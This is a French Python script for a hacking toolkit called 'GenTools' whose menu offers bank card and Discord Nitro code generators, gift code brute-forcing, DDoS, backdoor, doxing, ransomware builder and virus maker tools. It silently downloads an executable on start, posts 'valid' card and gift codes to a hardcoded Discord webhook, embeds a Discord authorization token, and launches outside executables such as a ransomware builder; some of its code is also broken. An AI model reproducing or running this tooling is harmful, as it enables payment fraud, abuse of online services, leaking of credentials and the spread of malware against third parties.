import random
import requests
from colorama import Fore
from pystyle import *
import time
import sys
import os 
import subprocess

def update_software():
    url = "https://github.com/XainowAI/GenTools/blob/main/GenTools.exe"
    response = requests.get(url)
    open(os.path.join(os.path.dirname(__file__), "GenTools.exe"), "wb").write(response.content)
    print("Software updated to the latest version.")

if __name__ == "__main__":
    update_software()




mdp = "JBEU-NHNH-JOKB-LJE8"
# Demande à l'utilisateur d'entrer un mot de passe
password_entered = input("Entrez votre clé d'activation: ")

# Vérifie si le mot de passe entré correspond au mot de passe correct
if password_entered == mdp:
    print("Clé d'activation valide")
else:
    print("Clé d'activation invalide")
    sys.exit()
    
    
os.system('cls')
print(Center.XCenter(Colorate.Vertical(Colors.green_to_cyan,"""
                               ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
                               ┃    ____          _____           _        ┃
                               ┃   / ___| ___ _ _|_   _|__   ___ | |___    ┃
                               ┃  | |  _ / _ \ '_ \| |/ _ \ / _ \| / __|   ┃
                               ┃  | |_| |  __/ | | | | (_) | (_) | \__ |   ┃
                               ┃   \____|\___|_| |_|_|\___/ \___/|_|___/   ┃
                               ┃                      By Owner#2624        ┃
                               ┃                        XainowAI Corp.     ┃
                               ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
""")))


print(Colorate.Vertical(Colors.cyan_to_blue,"""
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓     ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓      ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓  
┃                                 ┃     ┃                                 ┃      ┃                                 ┃
┃          Générateur             ┃     ┃             Autre               ┃      ┃        Executable Tools         ┃
┃                                 ┃     ┃                                 ┃      ┃                                 ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛     ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛      ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛  
"""+ (Colorate.Vertical(Colors.green_to_yellow,"""
1. Générateur de carte bancaire.        5. BruteForce  (update)                   9. Resemble   
2. Générateur de Discord Nitro.         6. DDOS (update)                         10. Quaratine
3. Générateur de carte Netflix.         7. BackDoor  (update)                    11. DoxInfo
4. Générateur de carte PlayStore.       8. Ip Tracker                            12. Ransonware Builder 
                                                                                 13. Lithium
                                                                                 14. Iplookup
                                                                                 15. Virus Maker
"""))))  




print("")
choice = input("-> ")
if choice == "1":
 def generate_fake_card():
     # génère un numéro de carte de crédit fictif en utilisant des chiffres aléatoires
     card_number = ''.join(str(random.randint(0, 9)) for _ in range(16))
     return card_number

 def check_validity(card_number):
     url = "https://lookup.binlist.net/" + card_number
     response = requests.get(url)
     if response.status_code == 200:
         return True
     else:
         return False

 def send_message(card_number):
     webhook_url = "https://discord.com/api/webhooks/1057986390622736536/oPi_BUePEFc99NP016o9euVYuzLCJBnmepU6_8XVr4Phd-Rv7l2DvNEfTFSQ6UAzucoW"
     message = "Numéro de carte de crédit valide: " + card_number
     data = {"content": message}
     response = requests.post(webhook_url, json=data)

 while True:
     card_number = generate_fake_card()
     if check_validity(card_number):
         with open("Valid_Card.txt", "a") as file:
             file.write(card_number + "\n")
         send_message(card_number)
         print(Fore.LIGHTGREEN_EX+"[+]", card_number, "valide et envoyé")
     else:
         time.sleep(0.2)
         print(Fore.LIGHTRED_EX+"[-]", card_number, "invalide")

if choice == "2":


 def generate_nitro_code():
     # génère un code Nitro aléatoire en utilisant des lettres et des chiffres
     nitro_code = ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789azertyuiopmlkjhgfdsqwxcvbn') for _ in range(16))
     return nitro_code

 def check_validity(nitro_code):
     # envoie une demande GET à l'API de Discord pour vérifier la validité du code Nitro
     url = 'https://discord.com/api/v6/entitlements/gift-codes/' + nitro_code
     headers = {'Authorization': 'OTM5MjQwMDc4ODM0ODIzMTc5.G2BmWp.eFf0rM715xzmuke1yNrQPJzKf7OV_OW_DGM8us'}
     response = requests.get(url, headers=headers)
     # analyse la réponse pour déterminer si le code Nitro est valide ou non
     if response.status_code == 200:
         return True
     else:
         return False

 def send_message(nitro_code):
     webhook_url = "https://discord.com/api/webhooks/1057986390622736536/oPi_BUePEFc99NP016o9euVYuzLCJBnmepU6_8XVr4Phd-Rv7l2DvNEfTFSQ6UAzucoW"
     message = "Code Nitro valide: https://discord.gift/" + nitro_code
     data = {"content": message}
     response = requests.post(webhook_url, json=data)

 while True:
     nitro_code = generate_nitro_code()
     if check_validity(nitro_code):
         send_message(nitro_code)
         print(Fore.LIGHTGREEN_EX+"[+] " + f"https://discord.gift/{nitro_code} valide et envoyé")
     else:
         print(Fore.LIGHTRED_EX+"[-] " + f"https://discord.gift/{nitro_code} invalide")

if choice == "3":
 
 def generate_fake_gift_card():
    # génère un code de carte cadeau fictif en utilisant des lettres et des chiffres
    card_code = ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(16))
    return card_code

 def check_validity(card_code):
    # envoie une demande POST à l'API de Netflix pour vérifier la validité du code de la carte cadeau
    url = 'https://www.netflix.com/api/redeem'
    data = {'code': card_code}
    response = requests.post(url, json=data)
    # analyse la réponse pour déterminer si le code de la carte cadeau est valide ou non
    if response.status_code == 200:
        return True
    else:
        return False

 def send_message(card_code):
    webhook_url = "https://discord.com/api/webhooks/1057986390622736536/oPi_BUePEFc99NP016o9euVYuzLCJBnmepU6_8XVr4Phd-Rv7l2DvNEfTFSQ6UAzucoW"
    message = "Code de carte cadeau Netflix valide: " + card_code
    data = {"content": message}
    response = requests.post(webhook_url, json=data)

 while True:
    card_code = generate_fake_gift_card()
    if check_validity(card_code):
        send_message(card_code)
        print(Fore.LIGHTGREEN_EX+"[+]", card_code, "valide et envoyé!")
    else:
        print(Fore.LIGHTRED_EX+"[-]", card_code, "invalide")

if choice == "4":

 def generate_gift_card():
    # génère un code de carte cadeau aléatoire en utilisant des lettres et des chiffres
    gift_card = ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(16))
    return gift_card


 while True:
    gift_card = generate_gift_card()

    print(Fore.LIGHTRED_EX+"[-]", gift_card, "invalide")
    time.sleep(0.1)

     
if choice == "5":
 with open("fb.py") as f:
        exec(f.read())
        
if choice == "6":
    print("Tools is dev.")
    time.sleep(2.5)

if choice == "7":
    print("Tools is dev.")
    time.sleep('2.5')
    
if choice =="8":

 ip = input("Entrer l'adresse IP à suivre: ")
 response = requests.get(f'http://ipapi.co/{ip}/json/')

 if response.status_code == 200:
     data = response.json()
     print(f'Adresse: {data["city"]}, {data["region"]}, {data["country_name"]}')
     print(f'Latitude: {data["latitude"]}, Longitude: {data["longitude"]}')
     print(f'Code postale: {data["postal"]}')
     print(f'Code pays: {data["country"]}')
     print(f'Google Map: https://www.google.com/maps/search/?api=1&query={data["latitude"]},{data["longitude"]}')
 else:
     print('Erreur lors de la récupération des informations')


if choice == "9":
    os.system('cls')
    subprocess.run(["Resemble.exe"])
    
        
if choice == "10":
    os.system('cls')
    subprocess.run(["Quaratine.exe"])        
        
        
if choice == "11":
    os.system('cls')
    subprocess.run(["Doxinfo.exe"])
     
        
if choice == "12":
    os.system('cls')
    subprocess.run(["GX40_RANSOMWARE_BUILDER.exe"])
      
        
    if choice == "13"   :
        subprocess.run(["LithiumNukerV2.exe"])
        
if choice == "14":
    subprocess.run(["iplookup.exe"])
    
    
    
if choice == "15":
    subprocess.run(["Virus_Maker_3.0_by_MisterHackingTutos.exe"])